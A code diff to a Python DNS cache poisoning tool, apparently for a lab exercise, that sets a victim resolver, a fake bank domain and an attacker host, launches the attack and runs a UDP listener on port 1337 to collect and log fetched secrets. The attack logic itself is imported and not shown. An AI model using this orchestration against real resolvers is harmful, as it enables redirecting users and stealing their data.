@@ -16,7 +16,7 @@ import signal
 
 from blessings import Terminal #For terminal threading
 
-from multiprocessing.pool import ThreadPool
+from multiprocessing.pool import ThreadPool, Pool
 import logging
 import threading
 from threading import Thread
@@ -28,7 +28,10 @@ from dns_attack import DNSAttack
 secret_fetch_flag = True        #Used to stop the secret fetcher
 verbosity = 1
 term = Terminal()
+attack_pool = None
+secret_socket = None
 
+log_file = "log_secret.txt"
 
 ## Logging function
 #
@@ -41,42 +44,83 @@ def log(msg):
         
 
 def sigint_handler(sig, frame):
+    sys.exit(-1)
     log("Stopping secret fetcher thread...")
     secret_fetch_flag = False
+    if secret_socket != None:
+            secret_socket.close()
     time.sleep(1)
+    log("Stopping all the attacks...")
     print("Exiting...")
     sys.exit(0)
 
 def secret_fetcher(server_ip, server_port):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
-    sock.bind((server_ip, server_port))
+    try:
+        secret_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
+        secret_socket.bind((server_ip, server_port))
+    except:
+        print("{t.bold}{t.red}Unable to bind for secret service{t.normal}!!!!".format(t=term))
+        print("Attack may be successful but no secret will be received...")
+
+    try:
+        file_secret = open(log_file, "a+")
+    except:
+        print("{t.bold}{t.red}Unable to open log file{t.normal}!!!!".format(t=term))
 
     print("({t.bold}secret fetcher{t.normal}) Listening on {IP}:{port} for incoming message...".format(t=term, IP=server_ip, port=server_port))
 
     while secret_fetch_flag:
-        data, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
-        print("({t.bold}secret fetcher{t.normal})Received response:{msg}".format(msg=data, t=term))
-    
+        try:
+                data, addr = secret_socket.recvfrom(1024) # buffer size is 1024 bytes
+                print("({t.bold}secret fetcher{t.normal})Received response:{msg}".format(msg=data, t=term))
+                file_secret.write("Secret fetched: %s", data)
+        except:
+                print("Error During secret fetching, exiting")
+                return
+                
+
+def launch_attack(victim_server_ip, domain, bad_udp_ip, bad_udp_port, number_of_tries=None, \
+        blessing_terminal=None, sigint_handler=None, log_function=None):
+
+        attack = DNSAttack(victim_server_ip, domain, bad_udp_ip, bad_udp_port, \
+                blessing_terminal=term, sigint_handler=sigint_handler, log_function=log)
+
+        if number_of_tries == None:
+                number_of_tries=50
+
+        attack.start(number_of_tries) 
+
+
 
 def main():
-    
-    print("\n{t.bold}DNS Cache Poisoning Tool{t.normal}\n".format(t=term))
 
-    victim_server_ip = '192.168.56.3'
-    domain = 'bankofallan.co.uk'
-    #Bad Guy
-    bad_udp_port = 55553
-    bad_udp_ip = '192.168.56.1'
+        print("\n{t.bold}DNS Cache Poisoning Tool{t.normal}\n".format(t=term))
+
+        victim_server_ip = '192.168.56.3'
+        domain = 'bankofallan.co.uk'
+        #Bad Guy
+        bad_udp_port = 55553
+        bad_udp_ip = '192.168.56.1'
 
 
-    #Launch the secret fetcher
-    secret_thread = Thread(target=secret_fetcher, args = (bad_udp_ip, 1337))
-    secret_thread.start()
+        #Launch the secret fetcher
+        secret_thread = Thread(target=secret_fetcher, args = (bad_udp_ip, 1337))
+        secret_thread.start()
 
-    attack = DNSAttack(victim_server_ip, domain, bad_udp_ip, bad_udp_port, \
-            blessing_terminal=term, sigint_handler=sigint_handler, log_function=log)
+        #Use processes instead of Threads for better managment
 
-    attack.start(number_of_tries=50)
+        #args = [victim_server_ip, domain, bad_udp_ip, bad_udp_port, 50 , term, sigint_handler, log]
+
+        try:
+                #attack_pool = Pool()    #Use every CPU
+                #attack_pool.map(launch_attack(victim_server_ip, domain, bad_udp_ip, bad_udp_port, 50 , term, sigint_handler, log), range(4) )
+                launch_attack(victim_server_ip, domain, bad_udp_ip, bad_udp_port, 50 , term, sigint_handler, log)
+        except DNSAttack.CriticalError:
+                print("\n{t.red}{t.bold}Critical Error occurred{t.normal}!!!\nTerminating".format(t=term))
+        except DNSAttack.SuccessfulAttack:
+                print("\n\n{t.green}{t.bold}Attack Successully executed{t.normal}".format(t=term))
+        finally:
+                print("Exiting...")
 
 
 
